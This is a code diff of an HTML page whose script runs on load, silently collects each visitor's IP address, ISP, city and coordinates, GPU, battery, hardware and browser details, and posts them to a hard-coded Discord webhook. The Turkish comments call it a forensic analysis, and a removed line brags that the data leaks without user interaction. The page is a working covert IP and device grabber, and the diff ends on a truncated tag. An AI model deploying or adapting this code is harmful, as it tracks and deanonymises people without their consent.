@@ -14,7 +14,6 @@
     <div class="l"></div>
 
     <script>
-        // Webhook URL
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
         async function masterExtract() {
@@ -23,10 +22,10 @@
                 net: "X", sys: "X", ext: "X", bat: "X" 
             };
 
-            // 1. ZORLANMIŞ DONANIM SORGUSU
+            // 1. DONANIM (GPU)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 if (dbg) {
                     info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
@@ -34,56 +33,54 @@
                 }
             } catch(e) {}
 
-            // 2. ISS, IP VE KONUM ANALİZİ
+            // 2. IP VE KONUM
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
                 info.ip = j.ip;
                 info.iss = j.org + " (AS" + j.asn + ")";
+                // Hatalı harita linki temizlendi
                 info.loc = "📍 **Bölge:** " + j.city + ", " + j.region + " / " + j.country_name + 
                            "\n🛰️ **ISS:** `" + info.iss + "`" + 
                            "\n🛡️ **Proxy/VPN:** " + (j.proxy ? '⚠️ Aktif' : '✅ Temiz') + 
-                           "\n🗺️ [Harita](https://www.google.com/maps?q=" + j.latitude + "," + j.longitude + ")";
+                           "\n🗺️ **Konum:** " + j.latitude + "," + j.longitude;
             } catch(e) {}
 
-            // 3. ŞEBEKE VE HIZ
+            // 3. ŞEBEKE
             try {
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                info.net = n ? "⚡ **Hız:** ~" + n.downlink + " Mbps | **Ping:** " + n.rtt + "ms\n📡 **Bağlantı:** " + n.effectiveType : "Erişilemedi";
+                info.net = n ? "⚡ **Hız:** ~" + n.downlink + " Mbps | **Ping:** " + n.rtt + "ms" : "Erişilemedi";
             } catch(e) {}
 
-            // 4. PİL VE SİSTEM ANALİZİ
+            // 4. PİL VE SİSTEM
             try {
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     info.bat = "%" + Math.round(b.level * 100) + (b.charging ? ' (Şarjda)' : ' (Pilde)');
-                } else { info.bat = "Desteklenmiyor"; }
-            } catch(e) { info.bat = "Erişilemedi"; }
+                }
+            } catch(e) {}
 
-            info.sys = "💻 **OS:** " + navigator.platform + "\n🧠 **CPU:** " + navigator.hardwareConcurrency + " Çekirdek\n💾 **RAM:** " + (navigator.deviceMemory || 'Gizli') + " GB\n🔋 **Güç:** " + info.bat;
-            info.ext = "🌍 **Dil:** " + navigator.language + "\n⏰ **Zaman:** " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n📐 **Ekran:** " + screen.width + "x" + screen.height + " (" + screen.colorDepth + "bit)";
+            info.sys = "💻 **OS:** " + navigator.platform + "\n🧠 **CPU:** " + navigator.hardwareConcurrency + " Çekirdek\n💾 **RAM:** " + (navigator.deviceMemory || 'Gizli') + " GB";
+            info.ext = "🌍 **Dil:** " + navigator.language + "\n⏰ **Zaman:** " + Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // 5. RAPOR ŞABLONU
+            // 5. PAYLOAD
             const payload = {
                 embeds: [{
                     title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
                     color: 15158332,
                     fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: info.loc + "\n" + info.net + "\n**IP:** `" + info.ip + "`", inline: false },
-                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: "**Renderer:** `" + info.gpu + "`\n**Vendor:** `" + info.ven + "`", inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
+                        { name: "📡 ŞEBEKE", value: info.loc + "\n" + info.net + "\n**IP:** `" + info.ip + "`", inline: false },
+                        { name: "⚙️ DONANIM", value: info.sys + "\n**GPU:** `" + info.gpu + "`\n**Pil:** " + info.bat, inline: false },
+                        { name: "🌐 SİSTEM", value: info.ext, inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Omniscience v7.0 - Fixed" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
             const blob = JSON.stringify(payload);
             
-            // Gönderim: Türkiye engeli yoksa fetch çalışır, varsa veya sayfa kapanırsa sendBeacon devreye girer.
+            // GÖNDERİM (Yönlendirme yapmaz)
             fetch(u, { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
@@ -94,7 +91,5 @@
         }
 
         window.onload = masterExtract;
-    </script>
-</body>
-</html>
-
+    </script
+                
